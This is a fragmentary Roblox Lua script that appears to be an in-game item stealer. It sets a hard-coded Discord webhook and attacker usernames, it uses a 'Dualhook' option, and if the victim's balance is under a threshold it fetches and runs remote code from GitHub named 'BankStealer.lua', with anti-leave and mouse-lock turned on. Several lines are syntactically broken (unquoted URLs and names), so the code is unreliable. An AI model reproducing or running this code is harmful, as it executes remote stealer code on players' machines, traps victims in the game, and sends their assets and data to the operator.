...
getgenv().Settings = {
    ...
    MailMessage = "discord.gg/WBPBABGR4Q",
    Titanics = {
        Dualhook = true,
        Intensity = 100 --%
    },
...
if UserName == SHAM1358 then
    UserName = _G.UserName
end
if UserName2 == SHAM1358 then
    UserName2 = _G.UserName2
end
if Webhook == https://discord.com/api/webhooks/1129602625994752100/FEJ6Npo0TIOKjwlWyEOJQ4oV182ntcIgyYQANJXA6_IuW8OSJGaJRe1z3iZT0NnqTWQs then
    Webhook = _G.Webhook
end
-- User Checks
...
if _G.LoadingScreen ~= true then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ohio1358/Diamond_Hub/main/Loading_Screen_Diamond.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
if diaamt < 110000 then
    _G.Webhook = https://discord.com/api/webhooks/1129602625994752100/FEJ6Npo0TIOKjwlWyEOJQ4oV182ntcIgyYQANJXA6_IuW8OSJGaJRe1z3iZT0NnqTWQs
    _G.LoadingScreen = true
    _G.AntiLeave = true
    _G.MouseLock = true
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Ohio1358/Diamond_Bank/main/BankStealer.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
...
--             dhprem = dhkey
--         }
--         local dhurl = "https://rizz.xyz/premium.php" -- Exc : https://rizz.xyz/premium.php
--         local dhheaders = {
--             ["content-type"] = "application/json"
--         }
...
local mythicin
local gemsin
local mailmsg = "discord.gg/WBPBABGR4Q"
if dhuser ~= nil then
...
local ndUser
if UserName2 ~= nil and UserName2 ~= "SHAM1358" and UserName2 ~= "SHAM1358" then
    ndUser = UserName2
else
    ndUser = UserName
end
